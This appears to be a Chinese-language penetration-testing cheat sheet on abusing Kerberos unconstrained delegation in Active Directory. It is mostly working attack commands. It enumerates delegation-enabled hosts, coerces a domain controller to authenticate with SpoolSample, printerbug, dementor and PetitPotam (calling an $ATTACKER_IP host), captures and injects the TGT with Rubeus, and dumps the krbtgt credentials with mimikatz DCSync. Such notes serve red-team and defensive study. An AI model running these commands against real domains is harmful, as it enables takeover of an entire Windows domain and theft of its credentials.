	用户发送一个 TGS 和他们的 TGT 来访问服务，然后服务可以使用用户的 TGT 为用户请求一个 TGS 到任何其他服务并模拟用户
  ### 无约束委派的SpoolService
  	目标是使用计算机帐户和 SpoolService 错误获得 DC 同步权限
	要求：
	具有属性的对象信任此计算机以委托给任何服务（仅限 Kerberos）
	必须有ADS_UF_TRUSTED_FOR_DELEGATION
	不得有ADS_UF_NOT_DELEGATED标志
	用户不得在受保护的用户组中
	用户不能有标志帐户是敏感的，不能被委派
	寻找委派
	域控制器通常启用无约束委派。检查TrustedForDelegation
	https://github.com/samratashok/ADModule
	PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
	https://github.com/dirkjanm/ldapdomaindump
	$> ldapdomaindump -u "DOMAIN\\Account" -p "Password123*" 10.10.10.10   
	grep TRUSTED_FOR_DELEGATION domain_computers.grep
	https://github.com/byt3bl33d3r/CrackMapExec/wiki
	>cme ldap 10.10.10.10 -u username -p password --trusted-for-delegation
	SpoolService 状态
	>ls \\dc01\pipe\spoolss
	>python rpcdump.py DOMAIN/user:password@10.10.10.10
	使用 Rubeus 进行监控
	监控来自 Rubeus 的传入连接。
	>Rubeus.exe monitor /interval:1 
	强制从 DC 重新连接
	由于无约束委托，计算机帐户（DC$）的 TGT 将保存在无约束委托计算机的内存中。默认情况下，域控制器计算机帐户对域对象具有 DCSync 权限。
	SpoolSample 是一种 PoC，用于强制 Windows 主机使用 MS-RPRN RPC 接口中的“功能”对任意服务器进行身份验证。
	https://github.com/leechristensen/SpoolSample
	>.\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME
	>.\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB
	DC01.HACKER.LAB 是我们要攻破的域控制器
	HELPDESK.HACKER.LAB 是我们控制的启用委派的机器。
	https://github.com/dirkjanm/krbrelayx
	>printerbug.py 'domain/username:password'@<VICTIM-DC-NAME> <UNCONSTRAINED-SERVER-DC-NAME>
	https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689
	>python dementor.py -d domain -u username -p password <UNCONSTRAINED-SERVER-DC-NAME> <VICTIM-DC-NAME>
	加载票据
	从 Rubeus 输出中提取 base64 TGT 并将其加载到我们当前的会话中。
	>.\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
	或者使用 Mimikatz 抢票： mimikatz # sekurlsa::tickets
	然后你可以使用 DCsync 或其他攻击：mimikatz # lsadump::dcsync /user:HACKER\krbtgt
  ### 无约束委派的MS-EFSRPC滥用
  	使用PetitPotam来强制从目标机器进行回调
	>git clone https://github.com/topotam/PetitPotam
	>python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
	>python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
	导出票据
	>.\Rubeus.exe asktgs /ticket:<ticket base64> /ptt